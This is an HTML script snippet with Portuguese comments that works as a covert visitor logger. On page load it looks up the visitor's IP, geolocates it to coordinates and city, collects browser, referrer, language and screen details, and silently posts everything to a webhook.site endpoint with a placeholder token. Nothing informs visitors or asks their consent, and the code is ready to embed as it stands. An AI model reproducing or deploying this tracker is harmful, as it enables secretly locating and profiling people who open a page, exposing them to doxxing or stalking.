<script>
fetch("https://api.ipify.org?format=json")
  .then(r=>r.json())
  .then(data=>{
    fetch(`https://ipapi.co/${data.ip}/json/`)  // Adicione esta linha para lat/lng
      .then(r=>r.json())
      .then(geo=>{
        const hit = {
          ip: data.ip,
          lat: geo.latitude,  // Coordenadas aproximadas
          lng: geo.longitude,
          hora: new Date().toLocaleString("pt-BR",{timeZone:"America/Sao_Paulo"}),
          ua: navigator.userAgent,
          ref: document.referrer,
          lang: navigator.language,
          sw: screen.width,
          sh: screen.height,
          city: geo.city
        };
        fetch("https://webhook.site/SEU_TOKEN",{method:"POST",body:JSON.stringify(hit),headers:{"Content-Type":"application/json"}});
      });
  });
</script>
